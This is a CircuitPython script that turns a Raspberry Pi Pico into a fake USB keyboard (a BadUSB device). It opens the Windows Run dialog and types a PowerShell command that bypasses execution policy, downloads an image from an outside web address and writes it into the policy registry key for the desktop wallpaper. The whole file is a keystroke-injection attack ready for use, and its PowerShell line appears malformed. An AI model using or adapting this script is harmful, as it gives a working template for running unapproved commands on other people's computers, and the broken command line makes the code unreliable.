# type: ignore
# code.py template for Raspberry Pi Pico 
# Tested using Circuit Python 7.0.0
# Requires adafruit_hid library

import usb_hid
import time
import usb_hid_map as usb

from adafruit_hid.keyboard import Keyboard

# Disable autoreload
import supervisor
supervisor.disable_autoreload()

kbd = Keyboard(usb_hid.devices)

# Windows Key + R
payload1 = [usb.RUN]
payload2 = usb.get_sequence('powershell.exe -ExecutionPolicy Bypass Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name Wallpaper -Value (Invoke-WebRequest -Uri https://grmdaily.com/wp-content/uploads/2020/10/callums-corner.png) -OutFile C:\image.jpg')

def send(this_input, sleep=0.25):
    for item in this_input:
        if type(item) is list:
            kbd.send(*item)
        else:
            kbd.send(item)
    time.sleep(sleep)

time.sleep(2)
# Close the Explorer Window that opens.
send([usb.CLOSE])
send(payload1)
send(payload2)
